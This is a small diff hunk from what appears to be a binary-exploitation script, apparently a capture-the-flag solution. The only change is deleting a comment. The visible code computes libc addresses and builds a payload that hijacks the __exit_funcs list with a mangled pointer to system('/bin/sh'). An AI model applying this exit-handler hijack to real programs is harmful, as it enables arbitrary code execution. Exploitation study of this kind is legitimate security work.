@@ -32,7 +32,7 @@ print("libc_base @ ", hex(libc_base))
 
 system = libc_base + libc.symbols['system']
 sh = libc_base + 0x1b75aa 
-__exit_funcs = libc_base + 0x1eb718 # fs:0x30
+__exit_funcs = libc_base + 0x1eb718
 
 
 payload = flat(0, 1, 4, mangle(system), sh) # fake exit_fn
